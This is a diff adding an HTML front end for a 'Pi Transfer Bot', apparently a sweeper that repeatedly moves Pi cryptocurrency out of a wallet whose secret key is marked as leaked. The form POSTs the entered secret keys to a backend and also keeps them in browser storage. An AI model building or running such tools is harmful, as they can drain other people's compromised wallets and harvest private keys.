@@ -1,0 +1,121 @@
+<!-- index.html -->
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Pi Transfer Bot</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #f5f7fa; padding: 20px; }
+    h2 { text-align: center; margin-bottom: 20px; }
+    label { font-weight: bold; }
+    input, select, textarea {
+      width: 100%; padding: 8px; margin: 6px 0 12px 0;
+      border: 1px solid #ccc; border-radius: 6px;
+    }
+    textarea { resize: vertical; height: 100px; }
+    .container {
+      max-width: 800px; margin: auto; background: #fff; padding: 25px;
+      border-radius: 10px; box-shadow: 0 0 12px rgba(0,0,0,0.1);
+    }
+    .button-group {
+      display: flex; gap: 10px; justify-content: center; margin-top: 20px;
+    }
+    button {
+      padding: 10px 20px; background-color: #1976d2;
+      color: white; border: none; border-radius: 6px; cursor: pointer;
+    }
+    button:hover { background-color: #0d47a1; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Pi Auto Transfer</h2>
+    <label>Pi ví bị lộ khả dụng (Secret Key):</label>
+    <input type="text" id="leakedWallet" placeholder="SC..."/>
+    <label>Pi ví đang khoá:</label>
+    <input type="text" id="lockedWallet" placeholder="(opsional)"/>
+    <label>Pi ví ký cùng khả dụng:</label>
+    <input type="text" id="coSignWallet" placeholder="(opsional)"/>
+    <label>Địa chỉ ví nạp phí (Fee Wallet):</label>
+    <input type="text" id="feeWallet" placeholder="SC..."/>
+    <label>Số ví nhận khả dụng (Receiver Address):</label>
+    <input type="text" id="recipient" placeholder="G..."/>
+    <label>Số Pi di chuyển:</label>
+    <input type="number" id="amount" step="0.0001" placeholder="Contoh: 1.5"/>
+    <label>Thời gian hẹn giờ chuyển Pi:</label>
+    <input type="datetime-local" id="sendTime"/>
+    <label>Số lượng:</label>
+    <input type="number" id="repeat" min="1" value="1"/>
+    <label>Chu kỳ quét lệnh (miligiây):</label>
+    <input type="number" id="interval" value="1000"/>
+    <label>Máy chủ Pi (IP Node):</label>
+    <input type="text" id="nodeIP" placeholder="https://116.101.173.230"/>
+    <label>Mode Transfer:</label>
+    <select id="transferMode">
+      <option value="send">Send</option>
+      <option value="claimable">Claimable Balance</option>
+      <option value="feein">Fee In</option>
+      <option value="feeout">Fee Out</option>
+    </select>
+    <div class="button-group">
+      <button onclick="execute()">Thực hiện</button>
+      <button onclick="saveConfig()">Lưu</button>
+      <button onclick="loadConfig()">Mở</button>
+    </div>
+    <label>Kết quả / Log:</label>
+    <textarea id="log" readonly></textarea>
+  </div>
+  <script>
+    function log(msg) {
+      const logArea = document.getElementById('log');
+      const timestamp = new Date().toLocaleTimeString();
+      logArea.value += `[${timestamp}] ${msg}\n`;
+      logArea.scrollTop = logArea.scrollHeight;
+    }
+
+    function execute() {
+      const config = getConfig();
+      fetch("/save-config", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(config)
+      })
+      .then(() => log("✅ Konfigurasi dikirim ke backend."))
+      .catch(err => log("❌ Gagal kirim konfigurasi: " + err.message));
+    }
+
+    function getConfig() {
+      return {
+        leakedWallet: document.getElementById('leakedWallet').value,
+        lockedWallet: document.getElementById('lockedWallet').value,
+        coSignWallet: document.getElementById('coSignWallet').value,
+        feeWallet: document.getElementById('feeWallet').value,
+        recipient: document.getElementById('recipient').value,
+        amount: document.getElementById('amount').value,
+        sendTime: document.getElementById('sendTime').value,
+        repeat: document.getElementById('repeat').value,
+        interval: document.getElementById('interval').value,
+        nodeIP: document.getElementById('nodeIP').value,
+        transferMode: document.getElementById('transferMode').value
+      };
+    }
+
+    function saveConfig() {
+      const config = getConfig();
+      localStorage.setItem('pi_config', JSON.stringify(config));
+      log("✅ Konfigurasi disimpan.");
+    }
+
+    function loadConfig() {
+      const config = JSON.parse(localStorage.getItem('pi_config') || '{}');
+      for (const key in config) {
+        if (document.getElementById(key)) {
+          document.getElementById(key).value = config[key];
+        }
+      }
+      log("📦 Konfigurasi dimuat.");
+    }
+  </script>
+</body>
+</html>
